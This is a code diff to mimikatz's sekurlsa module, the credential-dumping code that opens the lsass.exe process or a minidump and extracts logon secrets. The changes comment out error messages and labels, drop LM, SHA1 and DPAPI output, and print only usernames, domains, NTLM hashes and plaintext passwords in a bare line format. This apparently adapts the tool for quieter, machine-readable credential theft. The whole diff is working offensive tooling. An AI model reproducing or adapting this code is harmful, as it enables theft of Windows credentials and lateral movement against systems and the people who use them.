@@ -165,15 +165,17 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 		if(pMinidumpName)
 		{
 			Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
-			kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
+			//kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
 			hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 		}
 		else
 		{
 			Type = KULL_M_MEMORY_TYPE_PROCESS;
-			if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
+			if (kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
 				hData = OpenProcess(processRights, FALSE, pid);
-			else PRINT_ERROR(L"LSASS process not found (?)\n");
+			else
+				return -1;
+			//else PRINT_ERROR(L"LSASS process not found (?)\n");
 		}
 
 		if(hData && hData != INVALID_HANDLE_VALUE)
@@ -188,24 +190,27 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 						cLsass.osContext.MinorVersion = pInfos->MinorVersion;
 						cLsass.osContext.BuildNumber  = pInfos->BuildNumber;
 					#if defined(_M_X64) || defined(_M_ARM64)
-						if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
-							PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
+						if (isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64)) {
+							//PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
+						}
 					#elif defined(_M_IX86)
-						if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL))
-							PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
+						if (isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL)) {
+							//PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
+						}
 					#endif
 					}
 					else
 					{
 						isError = TRUE;
-						PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
+						//PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
 					}
 				}
 				else
 				{
 				#if defined(_M_IX86)
-					if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
-						PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
+					if(IsWow64Process(GetCurrentProcess(), &isError) && isError){
+						//PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
+					}
 					else
 				#endif
 					{						
@@ -237,22 +242,22 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 							if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
 							{
 								status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);
-								if(!NT_SUCCESS(status))
-									PRINT_ERROR(L"Key import\n");
+								//if(!NT_SUCCESS(status))
+								//	PRINT_ERROR(L"Key import\n");
 							}
-							else PRINT_ERROR(L"Logon list\n");
+							//else PRINT_ERROR(L"Logon list\n");
 						}
-						else PRINT_ERROR(L"Modules informations\n");
+						//else PRINT_ERROR(L"Modules informations\n");
 					}
-					else PRINT_ERROR(L"Local LSA library failed\n");
+					//else PRINT_ERROR(L"Local LSA library failed\n");
 				}
 			}
-			else PRINT_ERROR(L"Memory opening\n");
+			//else PRINT_ERROR(L"Memory opening\n");
 
 			if(!NT_SUCCESS(status))
 				CloseHandle(hData);
 		}
-		else PRINT_ERROR_AUTO(L"Handle on memory");
+		//else PRINT_ERROR_AUTO(L"Handle on memory");
 
 		if(!NT_SUCCESS(status))
 			cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
@@ -376,14 +381,14 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LO
 
 		//if(!sub || (*sub != 90 && *sub != 96))
 		//{
-			kuhl_m_sekurlsa_printinfos_logonData(pData);
+			//kuhl_m_sekurlsa_printinfos_logonData(pData);
 			for(i = 0; i < pLsassData->nbPackages; i++)
 			{
 				if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
 				{
-					kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
+					//kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
 					pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData);
-					kprintf(L"\n");
+					//kprintf(L"\n");
 				}
 			}
 		//}
@@ -1068,29 +1073,32 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						pMSVHelper = kuhl_m_sekurlsa_msv_helper(pData->cLsass);
 						kull_m_string_MakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain), FALSE);
 						kull_m_string_MakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), FALSE);
-						kprintf(L"\n\t * Username : %wZ\n\t * Domain   : %wZ", (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain));
+						kprintf(L"%wZ\n%wZ\n", (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain));
+						//kprintf("%wZ\n", (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName));
+						//kprintf("%wZ\n", (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain));
 						if(!pMSVHelper->offsetToisIso || !*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisIso))
 						{
-							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisLmOwfPassword))
+							/*if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisLmOwfPassword))
 							{
 								kprintf(L"\n\t * LM       : ");
 								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
-							}
+							}*/
 							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword))
 							{
-								kprintf(L"\n\t * NTLM     : ");
+								//kprintf(L"\n\t * NTLM     : ");
 								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+								kprintf("\n");
 							}
-							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword))
+							/*if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword))
 							{
 								kprintf(L"\n\t * SHA1     : ");
 								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToShaOwPassword, SHA_DIGEST_LENGTH, 0);
-							}
-							if(pMSVHelper->offsetToisDPAPIProtected && *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisDPAPIProtected))
-							{
-								kprintf(L"\n\t * DPAPI    : ");
-								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH, 0); // 020000000000
-							}
+							}*/
+							//if(pMSVHelper->offsetToisDPAPIProtected && *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisDPAPIProtected))
+							//{
+							//	kprintf(L"\n\t * DPAPI    : ");
+							//	kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH, 0); // 020000000000
+							//}
 							if(sid && (*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) || *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword)))
 								kuhl_m_dpapi_oe_credential_add(sid, NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) ? msvCredentials + pMSVHelper->offsetToNtOwfPassword : NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword) ? msvCredentials + pMSVHelper->offsetToShaOwPassword : NULL, NULL, NULL);
 						}
@@ -1232,22 +1240,17 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					password = &mesCreds->Password;
 				}
 
-				if(password || !(flags & KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY))
+				if(password)
 				{
-					kprintf((flags & KUHL_SEKURLSA_CREDS_DISPLAY_LINE) ?
-						L"%wZ\t%wZ\t"
-						:
-						L"\n\t * Username : %wZ"
-						L"\n\t * Domain   : %wZ"
-						L"\n\t * Password : "
-						, username, domain);
+					kprintf(L"%wZ\n", username);
+					kprintf(L"%wZ\n", domain);
 
 					if(!password || kull_m_string_suspectUnicodeString(password))
 					{
 						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
-							kprintf(L"%.*s", password->Length / sizeof(wchar_t), password->Buffer);
+							kprintf(L"%.*s\n", password->Length / sizeof(wchar_t), password->Buffer);
 						else
-							kprintf(L"%wZ", password);
+							kprintf(L"%wZ\n", password);
 					}
 					else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
 
